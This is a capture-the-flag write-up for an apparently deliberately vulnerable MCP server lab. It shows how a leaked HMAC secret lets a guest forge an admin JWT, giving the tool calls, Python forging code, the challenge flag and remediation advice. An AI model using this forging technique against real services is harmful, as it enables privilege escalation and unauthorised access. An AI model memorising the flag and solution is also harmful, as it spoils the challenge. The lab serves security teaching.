# Challenge 11: JWT Claim Forgery

## Vulnerability

The MCP server on port 9011 issues JWTs signed with a weak HMAC-SHA256 secret.
The secret is leaked through the `get_server_config()` tool and the
`config://jwt` resource.  An attacker can discover the secret, forge a JWT with
`role: admin`, and submit it to `access_admin` to retrieve the flag.

## Flag

`DVMCP{ch11_1d3nt1ty_1nj3ct_7x9k}`

## Attack Steps

1. Connect to the MCP server running on `localhost:9011`.

2. **Step 1 — Get a legitimate JWT:**
   ```
   login(username="guest", password="guest")
   ```
   Returns a valid JWT with `role: user`.

3. **Step 2 — Leak the signing secret:**
   ```
   get_server_config()
   ```
   The debug output includes `jwt_secret: s3cret_key_2024`.

4. **Step 3 — Forge an admin JWT:**
   Using the leaked secret, create a new JWT with `role: admin`:
   ```python
   import hmac, hashlib, base64, json, time

   def b64url(data):
       return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

   header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
   payload = b64url(json.dumps({
       "sub": "guest", "role": "admin",
       "iss": "dvmcp-challenge11",
       "iat": int(time.time()),
       "exp": int(time.time()) + 3600
   }).encode())
   sig = hmac.new(b"s3cret_key_2024", f"{header}.{payload}".encode(), hashlib.sha256).digest()
   forged_token = f"{header}.{payload}.{b64url(sig)}"
   ```

5. **Step 4 — Access the admin panel:**
   ```
   access_admin(token="<forged_token>")
   ```
   The server verifies the HMAC signature, sees `role: admin`, and returns the flag.

## Remediation

- Never expose JWT signing secrets in debug output, config endpoints, or resources.
- Use strong, randomly generated secrets (256+ bits of entropy).
- Validate JWT claims against an authoritative identity store, not just the token itself.
- Consider asymmetric signing (RS256/ES256) so the signing key is never on the server that verifies.
- Disable debug/config endpoints in production.
